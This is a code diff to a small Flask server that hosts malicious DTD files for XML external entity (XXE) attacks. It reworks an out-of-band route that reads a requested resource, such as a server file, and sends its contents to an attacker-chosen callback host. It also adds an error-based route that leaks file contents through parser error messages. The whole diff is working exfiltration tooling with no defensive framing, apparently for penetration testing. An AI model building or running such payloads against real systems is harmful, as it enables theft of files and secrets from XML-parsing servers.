@@ -2,12 +2,24 @@ from flask import Flask, abort, request, Response
 
 app = Flask(__name__)
 
-collab = ""
+callback = ""
 
-@app.route("/malicious.dtd", methods=["GET"])
-def malicious():
-    if request.args.get('ext'):
-        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('ext') + '"><!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM \'' + collab + '/?x=%ext;\'>">%eval;%exfiltrate;'
+@app.route("/oob.dtd", methods=["GET"])
+def oob():
+    global callback
+    if request.args.get('resource'):
+        if request.args.get('callback'):
+            callback = request.args.get('callback')
+
+        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('resource') + '"><!ENTITY % eval "<!ENTITY &#x25; oob SYSTEM \'' + callback + '/?x=%ext;\'>">%eval;%oob;'
         return Response(xml, mimetype='text/xml')
     else:
-        abort(404, description="Missing external entity parameter 'ext'.")
+        abort(404, description="Missing external entity parameter 'resource'.")
+
+@app.route("/error.dtd", methods=["GET"])
+def error():
+    if request.args.get('resource'):
+        xml = '<!ENTITY % ext SYSTEM "' + request.args.get('resource') + '"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM \'file:///nonexistent/%ext;\'>">%eval;%error;'
+        return Response(xml, mimetype='text/xml')
+    else:
+        abort(404, description="Missing external entity parameter 'resource'.")
